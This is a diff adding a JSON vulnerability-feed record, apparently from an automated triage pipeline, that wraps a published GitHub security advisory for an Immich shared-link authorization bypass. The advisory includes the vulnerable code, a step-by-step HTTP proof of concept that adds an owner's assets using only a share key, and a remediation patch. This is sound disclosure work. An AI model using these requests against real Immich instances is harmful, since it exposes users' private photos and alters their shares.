@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"author\": null, \"closed_at\": null, \"collaborating_teams\": null, \"collaborating_users\": null, \"created_at\": null, \"credits\": [{\"login\": \"david3107\", \"type\": \"reporter\"}], \"credits_detailed\": [{\"state\": \"accepted\", \"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/20040740?v=4\", \"events_url\": \"https://api.github.com/users/david3107/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/david3107/followers\", \"following_url\": \"https://api.github.com/users/david3107/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/david3107/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/david3107\", \"id\": 20040740, \"login\": \"david3107\", \"node_id\": \"MDQ6VXNlcjIwMDQwNzQw\", \"organizations_url\": \"https://api.github.com/users/david3107/orgs\", \"received_events_url\": \"https://api.github.com/users/david3107/received_events\", \"repos_url\": \"https://api.github.com/users/david3107/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/david3107/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/david3107/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/david3107\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": null, \"vector_string\": null}, \"cvss_v4\": {\"score\": 6.9, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N\"}}, \"cwe_ids\": [\"CWE-284\"], \"cwes\": [{\"cwe_id\": \"CWE-284\", \"name\": \"Improper Access Control\"}], \"description\": \"This vulnerability has been found and chained by DCODX-AI. Validation of the exploit chain has been confirmed manually.\\r\\n\\r\\n\\r\\n### Summary\\r\\nAn authorization bypass in the shared-link access logic allows an attacker possessing only a shared link key or slug to add arbitrary assets owned by the link owner into that shared link without authenticating as the owner. This grants owner-level AssetShare modifications to anyone with the share key, enabling unauthorized modification of public shares, content manipulation, and privacy breaches.\\r\\n\\r\\n---\\r\\n\\r\\n### Details\\r\\n**Root cause:**  \\r\\nIn `checkSharedLinkAccess` the `Permission.AssetShare` branch uses the shared link's `userId` to perform owner-level checks: it calls `access.asset.checkOwnerAccess(sharedLink.userId, ids, false)`. This treats requests authenticated via a shared-link key as if they were made by the link owner, granting AssetShare access to anyone possessing only the share key/slug.\\r\\n\\r\\n**Incriminated source (snippet):**\\r\\n```ts\\r\\n// server/src/utils/access.ts\\r\\ncase Permission.AssetShare: {\\r\\n  // TODO: fix this to not use sharedLink.userId for access control\\r\\n  return await access.asset.checkOwnerAccess(sharedLink.userId, ids, false);\\r\\n}\\r\\n```\\r\\n\\r\\nThis pattern effectively elevates privileges for shared-link authenticated sessions by reusing owner-based access checks. The expected behavior is that shared-link authentication should be scoped to the assets explicitly present in the shared link (or limited further), and not treated as a full owner session.\\r\\n\\r\\n---\\r\\n\\r\\n### PoC\\r\\n**Prerequisites:** ability to perform HTTP requests to the target instance (local or test environment). The following PoC uses local hostnames used in the environment where this bug was discovered.\\r\\n\\r\\n1. **Login as owner**  \\r\\n   ```\\r\\n   POST http://immich.local.app:2283/api/auth/login\\r\\n   Content-Type: application/json\\r\\n\\r\\n   Body:\\r\\n   {\\r\\n     \\\"email\\\":\\\"owner@dcodx.com\\\",\\r\\n     \\\"password\\\":\\\"xxxxx\\\"\\r\\n   }\\r\\n   ```\\r\\n   *Expected:* HTTP 200/201 and access token / cookies.\\r\\n\\r\\n2. **Enumerate assets (owner session)**  \\r\\n   ```\\r\\n   GET http://immich.local.app:2283/api/assets/random?count=2\\r\\n   Authorization: Bearer <owner_access_token>\\r\\n   ```\\r\\n   *Action:* Extract `asset1` and `asset2` IDs from response.\\r\\n\\r\\n3. **Create an individual shared link as owner**  \\r\\n   ```\\r\\n   POST http://immich.local.app:2283/api/shared-links\\r\\n   Content-Type: application/json\\r\\n   Authorization: Bearer <owner_access_token>\\r\\n\\r\\n   Body:\\r\\n   {\\r\\n     \\\"type\\\":\\\"INDIVIDUAL\\\",\\r\\n     \\\"assetIds\\\":[\\\"<asset1>\\\"]\\r\\n   }\\r\\n   ```\\r\\n   *Expected:* Response contains `sharedLinkId` and `sharedLinkKey`.\\r\\n\\r\\n4. **Without owner credentials (new session), add another owner asset to the shared link using only the shared link key**  \\r\\n   ```\\r\\n   PUT http://immich.local.app:2283/api/shared-links/{sharedLinkId}/assets?key={sharedLinkKey}\\r\\n   Content-Type: application/json\\r\\n\\r\\n   Body:\\r\\n   {\\r\\n     \\\"assetIds\\\":[\\\"<asset2>\\\"]\\r\\n   }\\r\\n   ```\\r\\n\\r\\n5. **Observe result**  \\r\\n   *Expected:* HTTP 200 and response JSON:\\r\\n   ```json\\r\\n   {\\r\\n     \\\"assetId\\\":\\\"<asset2>\\\",\\r\\n     \\\"success\\\": true\\r\\n   }\\r\\n   ```\\r\\n   This confirms possession of only the shared link key allowed adding the owner's asset to the shared link (authorization bypass).\\r\\n\\r\\n**Dependencies:** requests (or any HTTP client)\\r\\n\\r\\n---\\r\\n\\r\\n### Impact\\r\\n**Type:** Authorization bypass (AuthZ) — .  \\r\\n**Who is impacted:** Owners of shared links and users whose assets are included in those links; site privacy and content integrity are at risk. Attackers in possession of shared link keys (with different Download, Upload and Metadata access) can manipulate shared-link contents (add owner's assets), potentially exposing private assets or altering public share content.\\r\\n\\r\\n---\\r\\n\\r\\n### Remediation\\r\\n1. **Do NOT treat shared-link authentication as equivalent to owner session for AssetShare.**  \\r\\n   In `server/src/utils/access.ts` change the `Permission.AssetShare` branch to **NOT** call `checkOwnerAccess(sharedLink.userId, ...)`. For anonymous/shared-link auth, either return an empty set or restrict results to assets already present in the shared link.\\r\\n\\r\\n2. **Require session authentication for owner-scoped modifications.**  \\r\\n   Require a valid owner session (not only the shared-link key/slug) for modifications such as adding/removing existing owner assets to shared links. Public shared-link access should be limited to read/download operations or, if uploads are permitted, limited to new uploads with explicit `allowUpload` checks and sandboxing.\\r\\n\\r\\n---\\r\\n\\r\\n### Recommended patch (conceptual)\\r\\nReplace owner-check call with restricted logic, for example:\\r\\n```ts\\r\\ncase Permission.AssetShare: {\\r\\n  // For shared-link auth, only allow operations on assets already present in the shared link.\\r\\n  // Do NOT call checkOwnerAccess(sharedLink.userId, ...).\\r\\n  const allowed = ids.filter(id => sharedLink.assetIds.includes(id));\\r\\n  return allowed;\\r\\n}\\r\\n```\\r\\nOr require session auth before allowing modifications that reference owner asset IDs.\\r\\n\", \"ghsa_id\": \"GHSA-hvq7-hq9r-8gjr\", \"html_url\": \"https://github.com/immich-app/immich/security/advisories/GHSA-hvq7-hq9r-8gjr\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hvq7-hq9r-8gjr\"}], \"private_fork\": null, \"published_at\": \"2026-07-06T09:50:44Z\", \"publisher\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/11602424?v=4\", \"events_url\": \"https://api.github.com/users/bo0tzz/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/bo0tzz/followers\", \"following_url\": \"https://api.github.com/users/bo0tzz/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/bo0tzz/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/bo0tzz\", \"id\": 11602424, \"login\": \"bo0tzz\", \"node_id\": \"MDQ6VXNlcjExNjAyNDI0\", \"organizations_url\": \"https://api.github.com/users/bo0tzz/orgs\", \"received_events_url\": \"https://api.github.com/users/bo0tzz/received_events\", \"repos_url\": \"https://api.github.com/users/bo0tzz/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/bo0tzz/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/bo0tzz/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/bo0tzz\", \"user_view_type\": \"public\"}, \"severity\": \"medium\", \"state\": \"published\", \"submission\": null, \"summary\": \"[DCODX-AI] Shared-link authentication allows adding owner's assets to shared links (AssetShare authorization bypass)\", \"updated_at\": \"2026-07-06T09:50:45Z\", \"url\": \"https://api.github.com/repos/immich-app/immich/security-advisories/GHSA-hvq7-hq9r-8gjr\", \"vulnerabilities\": [{\"package\": {\"ecosystem\": \"\", \"name\": \"\"}, \"patched_versions\": \"v3.0.0\", \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<=2.1.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "immich:ghsa-hvq7-hq9r-8gjr",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "<=2.1.0"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 6.9,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+    "fixed_versions": [
+      "v3.0.0"
+    ],
+    "mitigations": [],
+    "products": [
+      "Immich"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-17T23:39:58.116078Z",
+  "provenance": {
+    "content_sha256": "d159cc783f1ce9555d6479d904e29e4217b8d84a460bffd89baeee77ef7c8420",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-06T09:50:44Z",
+  "schema_version": 1,
+  "source_id": "immich_github",
+  "source_url": "https://github.com/immich-app/immich/security/advisories/GHSA-hvq7-hq9r-8gjr",
+  "status": "active",
+  "title": "[DCODX-AI] Shared-link authentication allows adding owner's assets to shared links (AssetShare authorization bypass)",
+  "updated_at": "2026-07-06T09:50:45Z",
+  "vendor": "Immich",
+  "vendor_advisory_id": "GHSA-hvq7-hq9r-8gjr"
+}
